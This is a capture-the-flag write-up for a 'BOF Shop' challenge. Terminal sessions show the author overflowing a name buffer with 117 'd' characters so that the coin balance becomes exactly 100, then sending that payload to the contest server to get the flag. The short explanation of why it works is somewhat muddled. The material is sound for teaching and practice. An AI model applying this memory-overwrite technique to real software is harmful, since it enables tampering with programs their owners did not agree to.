### Chall Desc:
Welcome to the BOF Shop! Now you have the chance to buy your own flag! All you need to do is get a few coins first. Good luck.

### Link of server: nc bin.bcactf.com 49174

### Source_code and binary:
[bof-shop.c](bof-shop.c)
[bof-shop](bof-shop)


### Soln:

The solution is self-explanatory. Since, the amount of money was dependent on the users name, there had to be a particular string assigned 100 coins.  
In this case, it was mapped with their ascii values and hecne `d` was the letter with `117` frequency as the sweet spot.  
I figured this out with hit and trials.

```py
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ ls
bof-shop
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ echo "bcactf{test_flag}" > flag.txt
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ ls
bof-shop  flag.txt
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ cat flag.txt
bcactf{test_flag}
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ python -c "print('A'*200)" | ./bof-shop
Hello there, welcome to the BOF Shop!
What's your name?
> Command 'python' not found, did you mean:
  command 'python3' from deb python3
  command 'python' from deb python-is-python3
Your balance: 0 coins

Sorry, but you need exactly 100 coins to purchase the flag.
Goodbye.
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ python3 -c "print('A'*200)" | ./bof-shop
Hello there, welcome to the BOF Shop!
What's your name?
> Your balance: 1094795585 coins

Sorry, but you need exactly 100 coins to purchase the flag.
Goodbye.
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ python3 -c "print('A'*100)" | ./bof-shop
Hello there, welcome to the BOF Shop!
What's your name?
> Your balance: 0 coins

Sorry, but you need exactly 100 coins to purchase the flag.
Goodbye.
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ python3 -c "print('A'*150)" | ./bof-shop
Hello there, welcome to the BOF Shop!
What's your name?
> Your balance: 1094795585 coins

Sorry, but you need exactly 100 coins to purchase the flag.
Goodbye.
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ python3 -c "print('A'*125)" | ./bof-shop
Hello there, welcome to the BOF Shop!
What's your name?
> Your balance: 1094795585 coins

Sorry, but you need exactly 100 coins to purchase the flag.
Goodbye.
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ python3 -c "print('A'*112)" | ./bof-shop
Hello there, welcome to the BOF Shop!
What's your name?
> Your balance: 0 coins

Sorry, but you need exactly 100 coins to purchase the flag.
Goodbye.
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ python3 -c "print('A'*117)" | ./bof-shop
Hello there, welcome to the BOF Shop!
What's your name?
> Your balance: 65 coins

Sorry, but you need exactly 100 coins to purchase the flag.
Goodbye.
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ python3 -c "print('z'*117)" | ./bof-shop
Hello there, welcome to the BOF Shop!
What's your name?
> Your balance: 122 coins

Sorry, but you need exactly 100 coins to purchase the flag.
Goodbye.
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ python3 -c "print('d'*117)" | ./bof-shop
Hello there, welcome to the BOF Shop!
What's your name?
> Your balance: 100 coins

Wow. Here, take the flag in exchange for your 100 coins.
bcactf{test_flag}

ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/desktop/binex$ python3 -c "print('d'*117)" | nc bin.bcactf.com 49174
Hello there, welcome to the BOF Shop!
What's your name?
> Your balance: 100 coins

Wow. Here, take the flag in exchange for your 100 coins.
bcactf{buFF3r_0v3rflow_M4D3_3asy_71f7e2}
```

Thank you
